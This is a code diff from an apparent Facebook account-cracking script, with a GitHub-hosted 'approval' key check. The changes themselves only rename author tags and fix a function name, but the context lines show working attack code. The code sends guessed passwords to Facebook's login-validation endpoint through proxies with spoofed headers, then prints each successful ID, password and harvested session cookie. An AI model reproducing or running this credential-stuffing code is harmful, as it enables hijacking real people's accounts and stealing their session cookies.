@@ -492,7 +492,7 @@ def crack(idf,pwv):
 			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				#Tutul-King
+				#RJRajuRazz
 				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•RJRajuRazz-Cp] {idf} • {pw}')     
 				os.system('espeak -a 300 " C,  P"')
 			    #open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -503,7 +503,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				#Tutul-King
+				#RJRajuRazz
 				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•RJ Raju Razz-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
 				print('\033[0;94m==============================================================')
 				os.system('espeak -a 300 " RJ,  Ok,  id"')
@@ -522,7 +522,7 @@ if __name__=='__main__':
 	try:os.system('touch prox.txt')
 	except:pass
 
-def Subscraption():
+def Subscription():
 	key1=open('/storage/emulated/0/android8.txt', 'r').read()
 	r1=requests.get("https://github.com/RJRajuRazz/Fire-Approval/blob/main/Fire-Approval.txt").text
 	if key1 in r1:
